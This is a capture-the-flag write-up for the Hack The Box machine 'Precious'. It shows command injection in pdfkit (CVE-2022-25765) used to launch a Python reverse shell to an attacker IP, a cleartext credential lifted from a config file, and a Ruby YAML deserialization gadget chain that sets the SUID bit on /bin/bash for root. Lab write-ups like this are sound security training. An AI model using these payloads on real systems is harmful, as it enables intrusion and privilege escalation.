# HTB-Precious

Hackthebox released a new machine called precious. On this machine, first we got the web service which converts the web-page to a PDF, which is vulnerable to command injection. Using that, get the rev shell, and for privilege escalation, use code execution through yaml deserialization attack. <br>

The IP of this machine is 10.129.166.100 <br>
<p align="center">
	<img src="Images/Precious.png" alt="Logo">
</p>

# Enumeration

### Nmap Scan
I started my enumeration with an nmap scan of `10.129.166.100` . <br> 
The NMAP command which I always use to scan is `nmap -T4 -A 10.129.166.100` <br>
From the above Nmap Scan I got this output :
```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-29 06:43 IST
Nmap scan report for precious.htb (10.129.166.100)
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
Nmap done: 1 IP address (1 host up) scanned in 75.33 seconds

```
As a result we got two ports open i.e. `22` and `80` and port `80` redirect us to `precious.htb`
<br>
Let's quickly add that in `/etc/hosts` file
````text
#HTB
10.129.166.100	precious.htb
````
<br> <br>
# Precious.htb 
When we visit `precious.htb`, there is a simple `web page convertor` which take the `URL` as input and give the `PDF` as output. <br> <br>
![image](https://user-images.githubusercontent.com/114393219/204418256-38c7833a-353d-4af4-a08c-2cc3237acdf5.png)

Let's look at functionality of the website.<br>
First I spawned the python http server using command `python3 -m http.server 80` on attacker machine
Then Input `IP` of our attacker/kali machine on the `precious.htb` site <br> <br>
![image](https://user-images.githubusercontent.com/114393219/204420631-829ff6d2-7cbd-4fbb-bcde-26f86953c8b1.png)<br> <br>
And it converted the webpage into PDF as expected, let's download the PDF .<br> <br>
![image](https://user-images.githubusercontent.com/114393219/204422059-d4c0fae4-a12d-4354-8386-cc04127344af.png)

Now analyze the pdf using `Exiftool`
<br>
````text 
└─# exiftool daxl8od9nu3vj1qadzpgpgnnegxe7d6k.pdf 
ExifTool Version Number         : 12.41
File Name                       : daxl8od9nu3vj1qadzpgpgnnegxe7d6k.pdf
Directory                       : .
File Size                       : 17 KiB
File Modification Date/Time     : 2022:11:29 07:34:04+05:30
File Access Date/Time           : 2022:11:29 07:34:09+05:30
File Inode Change Date/Time     : 2022:11:29 07:34:09+05:30
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6

````
From the above result we found out the pdfkit version `v0.8.6` . Well that's intresting 
<br>
The pdfkit is vulnerable to `CVE-2022-25765`
<br>
# CVE-2022-25765
More details : https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 <br>
After reading I came down to conclusion that we can use any get parameter name and inside that use the backticks to injection our command.
````test
http://10.10.XX.XX/?name=%20`parameter`
````
Let's check on the website : <br> <br>
![image](https://user-images.githubusercontent.com/114393219/204427344-cb96f77a-a6c3-4c98-b92e-71d60626147f.png)
<br><br>
And boom....we got the `id` as our parameter was specified <br> <br>
![image](https://user-images.githubusercontent.com/114393219/204427229-707815d2-e4f7-4992-88e7-105f34eba183.png)
<br><br>
Now let's try to gain reverse shell . <br>
The payload will look like this 
````text
http://10.10.XX.XX/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
````
Don't forget to start a listener on the attacker machine using command : `nc -lvnp 9001`
<br><br>
And boom we got the reverse shell successfully
````text
└─# nc -lvnp 9001             
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.166.100] 43272
$ ls
ls
app  config  config.ru	Gemfile  Gemfile.lock  pdf  public
$ id
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
$ whoami
whoami
ruby
$ cd /home
cd /home
$ ls
ls
henry  ruby
$ cd ruby
cd ruby
$ ls
ls
$ ls -al

ls -al
total 28
drwxr-xr-x 4 ruby ruby 4096 Nov 28 19:34 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Nov 28 19:34 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
````
<br><br>
We got login as user `ruby` , but only the user `henry` have access to user flag 
````text
$ cd henry
cd henry
$ ls
ls
user.txt
$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
````
<br>
Now we have to change our user `ruby` to `henry` .

# User Flag 
After searching through it , I found the `henry` credentials in config file in user `ruby` directory in `.bundle` folder 
````text
$ ls -al
ls -al
total 28
drwxr-xr-x 4 ruby ruby 4096 Nov 28 19:34 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Nov 28 19:34 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
$ cd .bundle
cd .bundle
$ ls
ls
config
$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
````
Now ssh into henry and Grab the user flag<br><br>
![image](https://user-images.githubusercontent.com/114393219/204431073-3a890a6c-33b3-4926-8805-09f6ad14cff9.png)

#Privilege Escalation

I tried to run `sudo -l` and found something intresting `update_dependencies.rb`
````text
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$ 
````
Let's check the contents of the file
````text
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
````
My looking at the this , I think that this is vunerable to `YAML Deserialization Attack`

Source :https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

We have to write exploit to our malicious `dependencies.yml` file
````text
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
````
By running our malicious file with our `id` param we get our desired output 
````text
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)

````
Now Let's change the command to set the permission of `/bin/bash` binary to SUID bit set.
<br>
````text
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
````
It worked, Now the `/bin/bash` binary has now the SUID permission .
<br><br>
![Screenshot from 2022-11-29 09-30-04](https://user-images.githubusercontent.com/114393219/204435789-eda96dcf-8388-4daa-9d5c-947669ab3f60.png)

Now `/bin/bash -p` and enjoyyy !! . Now you have root access <br><br>
![image](https://user-images.githubusercontent.com/114393219/204436213-f1f1e823-1144-4442-a19c-73f4443dbbb4.png)


